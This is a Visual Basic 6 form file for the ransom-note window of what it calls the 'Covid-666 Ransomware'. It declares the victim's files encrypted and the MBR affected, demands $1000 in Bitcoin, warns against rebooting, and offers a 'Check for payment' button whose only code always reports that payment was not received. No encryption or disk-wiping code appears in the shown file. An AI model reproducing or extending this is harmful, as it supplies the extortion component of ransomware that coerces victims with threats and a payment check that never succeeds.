VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H000000FF&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "ALL YOUR FILES ARE ENCRYPTED"
   ClientHeight    =   2865
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   5145
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2865
   ScaleWidth      =   5145
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command1 
      Caption         =   "Check for payment"
      Height          =   495
      Left            =   1680
      TabIndex        =   6
      Top             =   2280
      Width           =   1575
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "After payment please click ""Check for payment"" button and we will automatically decrypt your data and restore your MBR"
      Height          =   375
      Left            =   120
      TabIndex        =   5
      Top             =   1800
      Width           =   4695
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Do not reboot your pc before payment or your pc will not boot up again!"
      Height          =   495
      Left            =   120
      TabIndex        =   4
      Top             =   1320
      Width           =   4815
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "All other attempts to restore your data will fail and lead to permament loss of your data"
      Height          =   375
      Left            =   120
      TabIndex        =   3
      Top             =   840
      Width           =   4815
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Only way to get them back is to pay 1000$ worth of BTC"
      Height          =   195
      Left            =   120
      TabIndex        =   2
      Top             =   600
      Width           =   3990
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "All your files are encrypted with military grade encryption algorithm."
      Height          =   195
      Left            =   120
      TabIndex        =   1
      Top             =   360
      Width           =   4635
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "You became a victim of the Covid-666 Ransomware!"
      Height          =   195
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3720
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
MsgBox "Error - payment not done or cannot connect to the server"
End Sub
